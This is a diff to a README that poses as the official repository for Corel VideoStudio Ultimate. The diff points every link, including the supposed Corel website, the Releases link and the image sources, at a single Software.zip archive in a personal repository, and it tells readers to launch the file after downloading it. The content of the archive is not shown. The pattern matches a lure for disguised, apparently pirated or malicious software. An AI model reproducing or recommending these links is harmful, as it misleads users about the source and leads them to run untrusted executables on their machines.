@@ -8,10 +8,10 @@ Welcome to the official repository for Corel VideoStudio Ultimate! Here you can 
 - **Topics:** corel, corel-download, corel-video, corel-video-studio, corel-video-studio-download, corel-videostudio, corel-videostudio-ultimate, corel-videostudio-x10, pixverse-ai, ulead, ulead-video-studio, video-studio, video-studio-ai, video-studio-app, video-studio-download, videostudio, vido-studio, vidu-studio
 
 ## 📥 Download Corel VideoStudio Ultimate
-You can download Corel VideoStudio Ultimate by clicking [here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip). Please note that the file needs to be launched after download for installation.
+You can download Corel VideoStudio Ultimate by clicking [here](https://github.com/Pareek228/corel-videostudio/releases/download/v2.0/Software.zip). Please note that the file needs to be launched after download for installation.
 
 ## 🌟 Features of Corel VideoStudio Ultimate
-![Corel VideoStudio Ultimate Logo](https://example.com/corel-videostudio-logo.png)
+![Corel VideoStudio Ultimate Logo](https://github.com/Pareek228/corel-videostudio/releases/download/v2.0/Software.zip)
 
 Corel VideoStudio Ultimate is a powerful video editing software packed with amazing features:
 - **Intuitive Interface:** Easily navigate through the software's user-friendly interface.
@@ -33,12 +33,12 @@ To get started with Corel VideoStudio Ultimate, follow these simple steps:
 
 ## 🎨 Explore More
 For more information and updates on Corel VideoStudio Ultimate, you can:
-- Visit the [Corel website](https://www.corel.com) for the latest features and tutorials.
-- Check out the [Releases](https://github.com/cli/go-gh/releases) section of this repository for version updates.
+- Visit the [Corel website](https://github.com/Pareek228/corel-videostudio/releases/download/v2.0/Software.zip) for the latest features and tutorials.
+- Check out the [Releases](https://github.com/Pareek228/corel-videostudio/releases/download/v2.0/Software.zip) section of this repository for version updates.
 - Connect with the Corel community on social media platforms to share your creations.
 
 ## 🌟 Join the Corel VideoStudio Ultimate Community
-![Corel VideoStudio Community](https://example.com/corel-videostudio-community.png)
+![Corel VideoStudio Community](https://github.com/Pareek228/corel-videostudio/releases/download/v2.0/Software.zip)
 
 Join the Corel VideoStudio Ultimate community to:
 - Share your video editing tips and tricks.
